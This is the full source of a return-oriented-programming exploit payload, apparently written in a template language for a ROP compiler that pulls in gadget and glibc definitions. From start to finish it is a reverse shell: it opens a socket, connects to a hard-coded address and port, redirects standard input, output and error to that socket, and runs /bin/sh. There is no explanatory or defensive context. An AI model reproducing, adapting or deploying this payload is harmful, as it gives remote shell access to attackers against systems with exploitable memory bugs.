toy {
	{% include "gadgets.pro" %}
	{% include "glibc.pro" %}
	var fd;
	socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	// avoid clobbering rax by setting the argument to `undefined`
	store_rdx_rax(&fd, undefined);
	printf("socket fd = %d\n", fd);
	array addr["\x02\x00\x41\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"];
	connect(fd, addr, 0x10);
	{% for i in range(3): %}
		dup2(fd, {{i}});
	{% endfor %}
	system("/bin/sh");
	exit(1);
}
